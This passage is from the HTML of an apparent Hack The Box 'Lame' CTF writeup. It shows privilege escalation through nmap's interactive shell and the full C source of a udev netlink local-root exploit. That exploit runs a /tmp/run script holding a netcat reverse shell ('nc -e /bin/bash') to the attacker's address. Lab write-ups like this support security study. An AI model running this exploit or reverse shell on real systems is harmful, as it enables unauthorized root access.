+<pre tabindex="0"><code>Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !sh
+!sh
+sh-3.2$ id
+id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+sh-3.2$ wc /root/root.txt -c
+33 /root/root.txt
+</code></pre><h2 id="second-way-of-privilege-escalation">Second way of privilege escalation</h2>
+<pre tabindex="0"><code>$ uname -a
+Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+</code></pre><p>As the box is also running <a href="https://www.linux.com/news/udev-introduction-device-management-modern-linux-system/" target="_blank">UDEV</a>, <a href="https://www.exploit-db.com/exploits/8572" target="_blank">this</a> exploit seems interesting.</p>
+<p>We can send it to the box like we did with lse.sh and run it.</p>
+<h5 id="exploit-code-3">Exploit code:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netlink.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#ifndef NETLINK_KOBJECT_UEVENT
+</span><span style="color:#75715e">#define NETLINK_KOBJECT_UEVENT 15
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span>
+<span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+	<span style="color:#66d9ef">int</span> sock;
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>mp, <span style="color:#f92672">*</span>err;
+	<span style="color:#66d9ef">char</span> message[<span style="color:#ae81ff">4096</span>];
+	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">stat</span> st;
+	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">msghdr</span> msg;
+	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">iovec</span> iovector;
+	<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr_nl</span> address;
+
+	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
+		err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Pass the udevd netlink PID as an argument&#34;</span>;
+		printf(<span style="color:#e6db74">&#34;[-] Error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+		exit(<span style="color:#ae81ff">1</span>);
+	}
+
+	<span style="color:#66d9ef">if</span> ((stat(<span style="color:#e6db74">&#34;/etc/udev/rules.d/95-udev-late.rules&#34;</span>, <span style="color:#f92672">&amp;</span>st) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span>
+	    (stat(<span style="color:#e6db74">&#34;/lib/udev/rules.d/95-udev-late.rules&#34;</span>, <span style="color:#f92672">&amp;</span>st) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) {
+		err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Required 95-udev-late.rules not found&#34;</span>;
+		printf(<span style="color:#e6db74">&#34;[-] Error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+		exit(<span style="color:#ae81ff">1</span>);
+	}
+
+	<span style="color:#66d9ef">if</span> (stat(<span style="color:#e6db74">&#34;/tmp/run&#34;</span>, <span style="color:#f92672">&amp;</span>st) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+		err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/run does not exist, please create it&#34;</span>;
+		printf(<span style="color:#e6db74">&#34;[-] Error: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+		exit(<span style="color:#ae81ff">1</span>);
+	}
+	system(<span style="color:#e6db74">&#34;chmod +x /tmp/run&#34;</span>);
+
+	memset(<span style="color:#f92672">&amp;</span>address, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(address));
+	address.nl_family <span style="color:#f92672">=</span> AF_NETLINK;
+	address.nl_pid <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">1</span>]);
+	address.nl_groups <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+	msg.msg_name <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>address;
+	msg.msg_namelen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(address);
+	msg.msg_iov <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>iovector;
+	msg.msg_iovlen <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+
+	sock <span style="color:#f92672">=</span> socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+	bind(sock, (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>address, <span style="color:#66d9ef">sizeof</span>(address));
+
+	mp <span style="color:#f92672">=</span> message;
+	mp <span style="color:#f92672">+=</span> sprintf(mp, <span style="color:#e6db74">&#34;remove@/d&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+	mp <span style="color:#f92672">+=</span> sprintf(mp, <span style="color:#e6db74">&#34;SUBSYSTEM=block&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+	mp <span style="color:#f92672">+=</span> sprintf(mp, <span style="color:#e6db74">&#34;DEVPATH=/dev/foo&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+	mp <span style="color:#f92672">+=</span> sprintf(mp, <span style="color:#e6db74">&#34;TIMEOUT=10&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+	mp <span style="color:#f92672">+=</span> sprintf(mp, <span style="color:#e6db74">&#34;ACTION=remove&#34;</span>) <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+	mp <span style="color:#f92672">+=</span> sprintf(mp, <span style="color:#e6db74">&#34;REMOVE_CMD=/tmp/run&#34;</span>) <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+
+	iovector.iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)message;
+	iovector.iov_len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)(mp<span style="color:#f92672">-</span>message);
+
+	sendmsg(sock, <span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>);
+
+	close(sock);
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><pre tabindex="0"><code>gcc -o exp 8572.c
+</code></pre><pre tabindex="0"><code>echo &#39;#!/bin/bash&#39; &gt; /tmp/run
+echo &#39;nc -e /bin/bash 10.10.14.X 8888&#39; &gt;&gt; /tmp/run 
+</code></pre><pre tabindex="0"><code>cat /proc/net/netlink # To see UDEV PID 
+</code></pre><pre tabindex="0"><code># (box)
+$ ./exp 2687
+
+# (local)
+Connection received on 10.10.10.3 53745
+id
+uid=0(root) gid=0(root)
+</code></pre>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/h-con-writeup/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Hackplayers Conference 2020 Qualifiers CTF Writeup</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/traverxec-writeup-spanish/">
+                  <span class="button__text">[HackTheBox – Traverxec] Spanish Writeup</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
